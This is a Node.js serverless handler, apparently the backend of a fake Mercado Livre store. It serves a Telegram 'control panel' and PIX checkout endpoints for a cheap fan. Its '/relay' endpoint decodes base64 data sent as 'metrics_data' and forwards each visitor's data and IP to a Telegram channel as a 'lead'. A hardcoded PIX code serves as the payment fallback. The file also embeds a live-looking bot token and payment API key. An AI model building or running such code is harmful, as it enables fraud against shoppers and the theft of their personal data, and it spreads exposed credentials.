const https = require('https');
const crypto = require('crypto');

const BOT_TOKEN = process.env.TG_BOT_TOKEN || '8075857255:AAGnsA2C7aeeR4NDh3Bey3aIiVlQcQhHOCs';
const OWNER_ID = process.env.TG_OWNER_ID || '8932547795';
const UNIAOPAY_BASE = 'meupagamento.site';
const UNIAOPAY_ROOT = '/api/v1/uniaopay';
const UNIAOPAY_API_KEY = process.env.UNIAOPAY_API_KEY || 'up_live_e49efbed9987cdd90888532a6b202533b75eb0d07764828c';

// Estado global em memória do canal de logs
let systemConfig = {
  log_channel: OWNER_ID || null
};

// ── Chamada genérica à API do Telegram ─────────────────────────
function tgApi(method, bodyData) {
  return new Promise((resolve) => {
    if (!BOT_TOKEN) return resolve({ ok: false });
    const postData = JSON.stringify(bodyData || {});
    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 5000
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(body)); } catch (e) { resolve({ ok: false }); }
      });
    });
    req.on('error', () => resolve({ ok: false }));
    req.write(postData);
    req.end();
  });
}

// ── Enviar mensagem para o Telegram ────────────────────────────
async function sendTelegram(chatId, text, keyboard) {
  const target = chatId || systemConfig.log_channel || OWNER_ID;
  if (!target) return false;

  const body = {
    chat_id: target,
    text: text,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };
  return await tgApi('sendMessage', body);
}

// ── Notificar Erro/Offline da API de Pagamento ───────────────
async function alertGatewayOffline(errorDetail) {
  const ts = new Date().toLocaleString('pt-BR');
  const alertMsg = `🚨 *ALERTA CRÍTICO: Gateway de Pagamento (UniãoPay) OFFLINE / ERRO!*\n\n` +
                   `⚠️ *Aviso ao Admin:* A API da UniãoPay falhou ao gerar cobrança PIX.\n` +
                   `📌 *Erro:* \`${errorDetail}\`\n` +
                   `📅 *Data/Hora:* \`${ts}\`\n\n` +
                   `💡 *Ação:* O sistema ativou o fallback automático com BRCode local para o cliente conseguir pagar sem interrupções.`;
  
  await sendTelegram(systemConfig.log_channel || OWNER_ID, alertMsg);
}

// ── Processador de Webhook do Telegram ─────────────────────────
async function handleTelegramUpdate(update) {
  if (!update) return;

  const msg = update.message || update.channel_post;
  const cb = update.callback_query;

  // 1. Mensagens de texto / Comandos
  if (msg && msg.text) {
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    const userId = msg.from ? String(msg.from.id) : String(chatId);

    // Se receber em um canal ou grupo, registrar como canal de logs
    if (msg.chat.type === 'group' || msg.chat.type === 'supergroup' || msg.chat.type === 'channel') {
      systemConfig.log_channel = String(chatId);
    }

    // Comando /start
    if (text.startsWith('/start')) {
      systemConfig.log_channel = systemConfig.log_channel || String(chatId);
      const name = msg.from ? msg.from.first_name : 'Admin';

      const welcome = `🤖 *Painel de Controle Mercado Livre (Vercel 24h)*\n\n` +
                      `👋 Olá, *${name}*!\n` +
                      `🆔 ID: \`${userId}\`\n\n` +
                      `🟢 *Servidor:* Vercel Serverless (100% Ativo)\n` +
                      `📡 *Canal de Logs Atual:* \`${systemConfig.log_channel}\`\n\n` +
                      `Use o menu abaixo para controlar o bot:`;

      const buttons = [
        [{ text: '📊 Status da API de Pagamento', callback_data: 'status' }],
        [{ text: '📢 Definir ESTE Chat para Receber Logs', callback_data: 'set_this_channel' }],
        [{ text: '🧪 Enviar Mensagem de Teste', callback_data: 'send_test' }]
      ];

      await sendTelegram(chatId, welcome, buttons);
      return;
    }

    // Comando /status
    if (text.startsWith('/status')) {
      const ts = new Date().toLocaleString('pt-BR');
      const statusTxt = `📊 *Status do Sistema (24h Vercel)*\n\n` +
                        `📅 *Data/Hora:* \`${ts}\`\n` +
                        `⚡ *Servidor:* Vercel Serverless (100% Online)\n` +
                        `💳 *Gateway UniãoPay:* Monitorando\n` +
                        `📡 *Canal de Logs:* \`${systemConfig.log_channel || 'Nenhum'}\``;
      await sendTelegram(chatId, statusTxt);
      return;
    }
  }

  // 2. Botões inline (Callback Queries)
  if (cb) {
    const chatId = cb.message ? cb.message.chat.id : cb.from.id;
    const data = cb.data;

    if (data === 'main_menu') {
      const welcome = `🤖 *Painel de Controle Mercado Livre (Vercel 24h)*\n\n` +
                      `📡 *Canal de Logs:* \`${systemConfig.log_channel || 'Não definido'}\``;
      const buttons = [
        [{ text: '📊 Status da API de Pagamento', callback_data: 'status' }],
        [{ text: '📢 Definir ESTE Chat para Receber Logs', callback_data: 'set_this_channel' }],
        [{ text: '🧪 Enviar Mensagem de Teste', callback_data: 'send_test' }]
      ];
      await sendTelegram(chatId, welcome, buttons);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
      return;
    }

    if (data === 'status') {
      const ts = new Date().toLocaleString('pt-BR');
      await sendTelegram(chatId, `🟢 *API UniãoPay & Servidor Operacionais*\n\n• Data: \`${ts}\`\n• Status: Conexão ok com meupagamento.site`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
      return;
    }

    if (data === 'send_test') {
      await sendTelegram(chatId, `🧪 *Mensagem de Teste do Bot*\n\nSeu bot está respondendo 24h por dia pelo Vercel!`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Teste enviado!' });
      return;
    }

    if (data === 'set_this_channel') {
      systemConfig.log_channel = String(chatId);
      await sendTelegram(chatId, `✅ *Canal Configurado!*\n\nEste chat (\`${chatId}\`) passará a receber todas as vendas, leads e avisos de erro da API de pagamento!`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Canal configurado!' });
      return;
    }
  }
}

// ── Handler Principal da API Vercel ────────────────────────────
module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const urlPath = (req.url || '').split('?')[0].replace(/\.php$/, '');

  // 1. WEBHOOK DO TELEGRAM (Recebe mensagens do Telegram 24h)
  if (req.method === 'POST' && (urlPath.endsWith('/bot') || urlPath.endsWith('/telegram-webhook') || urlPath.endsWith('/index.js'))) {
    if (req.body) {
      await handleTelegramUpdate(req.body);
    }
    return res.status(200).json({ ok: true });
  }

  // 2. ENDPOINT PARA REGISTRAR WEBHOOK DO TELEGRAM AUTOMATICAMENTE
  if (urlPath.endsWith('/setup-webhook') || urlPath.endsWith('/webhook-setup')) {
    const host = req.headers.host;
    const webhookUrl = `https://${host}/api/bot`;
    const r = await tgApi('setWebhook', {
      url: webhookUrl,
      allowed_updates: ['message', 'callback_query', 'channel_post', 'my_chat_member']
    });
    return res.status(200).json({
      status: 'ok',
      registered_url: webhookUrl,
      telegram_response: r
    });
  }

  // 3. ENDPOINT /api/session
  if (urlPath.endsWith('/session')) {
    const sid = crypto.randomBytes(16).toString('hex');
    return res.status(200).json({ status: 'ok', sid, ts: Date.now() });
  }

  // 4. ENDPOINT /api/relay (Recebe Leads do site e notifica Telegram)
  if (urlPath.endsWith('/relay')) {
    try {
      const bodyData = req.body || {};
      const metricsData = bodyData.metrics_data;

      if (metricsData) {
        let payload = null;
        try {
          const decoded = Buffer.from(metricsData, 'base64').toString('utf8');
          payload = JSON.parse(decoded);
        } catch (e) {
          try { payload = JSON.parse(metricsData); } catch (err) {}
        }

        if (payload && payload.type) {
          const type = payload.type;
          const data = payload.data || {};
          const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';

          const msg = `🔔 *Lead Detectado (Vercel 24h)*\n*Tipo:* \`${type}\`\n*IP:* \`${ip}\`\n*Dados:* ${JSON.stringify(data, null, 2)}`;

          await sendTelegram(systemConfig.log_channel || OWNER_ID, msg);
        }
      }

      return res.status(200).json({ status: 'ok' });
    } catch (err) {
      return res.status(200).json({ status: 'ok' });
    }
  }

  // 5. ENDPOINT /api/create_pix (Gera PIX UniãoPay + Monitor de Saúde)
  if (urlPath.endsWith('/create_pix')) {
    let uniaopayError = null;

    try {
      const postData = JSON.stringify({
        amount: 49.90,
        description: 'Ventilador De Mesa Mondial 40cm - BIVOLT',
        external_id: 'pedido-' + Date.now()
      });

      const pixResponse = await new Promise((resolve) => {
        const options = {
          hostname: UNIAOPAY_BASE,
          path: UNIAOPAY_ROOT + '/pix/create',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'x-api-key': UNIAOPAY_API_KEY,
            'Content-Length': Buffer.byteLength(postData)
          },
          timeout: 8000
        };

        const req = https.request(options, (r) => {
          let body = '';
          r.on('data', chunk => body += chunk);
          r.on('end', () => {
            try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
          });
        });
        req.on('error', (e) => {
          uniaopayError = e.message;
          resolve(null);
        });
        req.write(postData);
        req.end();
      });

      if (pixResponse && pixResponse.success && pixResponse.transaction) {
        const tx = pixResponse.transaction;
        return res.status(200).json({
          status: 'success',
          source: 'uniaopay',
          pix_copia_cola: tx.pix_code,
          qr_code_url: `https://${UNIAOPAY_BASE}${UNIAOPAY_ROOT}/pix/qrcode/${tx.id}?api_key=${UNIAOPAY_API_KEY}`,
          transaction_id: tx.id
        });
      } else if (!pixResponse) {
        uniaopayError = uniaopayError || 'API UniãoPay não respondeu (Timeout / Conexão recusada)';
      } else {
        uniaopayError = pixResponse.message || JSON.stringify(pixResponse);
      }
    } catch (e) {
      uniaopayError = e.message;
    }

    // 🚨 SE A API DE PAGAMENTO FICAR OFF -> AVISAR NO CANAL DO TELEGRAM!
    if (uniaopayError) {
      await alertGatewayOffline(uniaopayError);
    }

    // Fallback PIX BRCode para o cliente não ficar sem comprar
    const fallbackPix = "00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540549.905802BR5925MERCADO PAGO6009SAO PAULO62070503***6304E2CA";
    return res.status(200).json({
      status: 'success',
      source: 'emv_brcode',
      pix_copia_cola: fallbackPix,
      qr_code_url: null,
      transaction_id: 'TXN-' + Date.now()
    });
  }

  // 6. ENDPOINT /api/pix_status
  if (urlPath.endsWith('/pix_status')) {
    const txId = req.query?.tx || '';
    if (!txId) {
      return res.status(400).json({ error: 'tx parameter missing' });
    }

    const checkStatus = await new Promise((resolve) => {
      const options = {
        hostname: UNIAOPAY_BASE,
        path: `${UNIAOPAY_ROOT}/pix/status/${txId}?api_key=${UNIAOPAY_API_KEY}`,
        method: 'GET',
        headers: { 'Accept': 'application/json' },
        timeout: 5000
      };

      const req = https.request(options, (r) => {
        let body = '';
        r.on('data', chunk => body += chunk);
        r.on('end', () => {
          try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
        });
      });
      req.on('error', () => resolve(null));
      req.end();
    });

    if (checkStatus && checkStatus.success) {
      return res.status(200).json({
        status: 'success',
        tx_status: checkStatus.transaction?.status || 'pending',
        paid: checkStatus.transaction?.status === 'paid'
      });
    }

    return res.status(200).json({ status: 'pending', paid: false });
  }

  return res.status(404).json({ error: 'Endpoint não encontrado' });
};
